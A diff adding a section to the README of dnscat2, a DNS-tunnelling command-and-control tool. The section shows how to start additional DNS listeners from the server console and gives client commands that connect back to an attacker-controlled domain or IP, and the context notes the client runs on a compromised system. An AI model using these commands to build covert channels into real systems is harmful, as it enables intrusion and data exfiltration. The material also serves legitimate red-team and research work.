@@ -300,6 +300,31 @@ of that argument (as domain=xxx). You can't just pass it on the
 commandline (due to a limitation of my command parsing; I'll likely
 improve that in a future release).
 
+When the process is running, you can start a new server using basically
+the exact same syntax:
+
+    dnscat2> start --dns=port=53532,domain=skullseclabs.org,domain=test.com
+    New window created: dns2
+    Starting Dnscat2 DNS server on 0.0.0.0:53532
+    [domains = skullseclabs.org, test.com]...
+    
+    Assuming you have an authoritative DNS server, you can run
+    the client anywhere with the following:
+      ./dnscat2 skullseclabs.org
+      ./dnscat2 test.com
+    
+    To talk directly to the server without a domain name, run:
+      ./dnscat2 --dns server=x.x.x.x,port=53532
+    
+    Of course, you have to figure out <server> yourself! Clients
+    will connect directly on UDP port 53532.
+
+You can run as many DNS listeners as you want, as long as they're on
+different hosts/ports. Once the data comes in, the rest of the process
+doesn't even know which listener data came from; in fact, a client can
+send different packets to different ports, and the session will continue
+as expected.
+
 ### Running a client
 
 The client - which is typically run on a system after compromising it -
